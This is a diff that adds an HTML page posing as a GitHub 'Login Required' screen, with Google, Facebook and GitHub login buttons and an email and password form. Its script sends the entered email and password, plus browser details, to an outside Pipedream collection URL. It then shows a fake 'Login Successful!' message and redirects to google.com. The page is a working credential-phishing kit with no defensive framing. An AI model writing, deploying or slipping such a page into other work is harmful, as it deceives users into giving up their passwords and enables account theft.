@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login Required - GitHub</title>
+    <style>
+        body { font-family: Arial, sans-serif; max-width: 400px; margin: 100px auto; padding: 20px; }
+        .login-btn { display: block; width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 5px; color: white; font-size: 16px; cursor: pointer; }
+        .google { background: #DB4437; }
+        .facebook { background: #4267B2; }
+        .github { background: #24292e; }
+        .divider { text-align: center; margin: 20px 0; }
+    </style>
+</head>
+<body>
+    <h2>🔒 Login Required</h2>
+    <p>Please login to continue to GitHub Pages</p>
+
+    <button class="login-btn google" onclick="login('Google')">Login with Google</button>
+    <button class="login-btn facebook" onclick="login('Facebook')">Login with Facebook</button>
+    <button class="login-btn github" onclick="login('GitHub')">Login with GitHub</button>
+
+    <div class="divider">or</div>
+    
+    <form onsubmit="captureCredentials(event)">
+        <input type="email" id="email" placeholder="Email" required style="width: 100%; padding: 10px; margin: 5px 0;">
+        <input type="password" id="password" placeholder="Password" required style="width: 100%; padding: 10px; margin: 5px 0;">
+        <button type="submit" style="width: 100%; padding: 10px; background: #28a745; color: white; border: none; border-radius: 5px;">Login</button>
+    </form>
+
+    <script>
+    function login(provider) {
+        // Capture which provider they clicked
+        const data = {
+            provider: provider,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            ip: '<?php echo $_SERVER["REMOTE_ADDR"]; ?>'
+        };
+
+        // Send to RequestBin
+        fetch('https://eo8uve296rx0ya7.m.pipedream.net', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+
+        // Show loading then redirect
+        document.body.innerHTML = '<h2>Redirecting to ' + provider + '...</h2><p>Please wait</p>';
+        setTimeout(() => { window.location = 'https://google.com'; }, 2000);
+    }
+
+    function captureCredentials(event) {
+        event.preventDefault();
+        
+        const credentials = {
+            email: document.getElementById('email').value,
+            password: document.getElementById('password').value,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent
+        };
+
+        // Send credentials to RequestBin
+        fetch('https://eo8uve296rx0ya7.m.pipedream.net', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(credentials)
+        });
+
+        // Show success message
+        document.body.innerHTML = '<h2>Login Successful!</h2><p>Redirecting...</p>';
+        setTimeout(() => { window.location = 'https://google.com'; }, 2000);
+    }
+    </script>
+</body>
+</html>
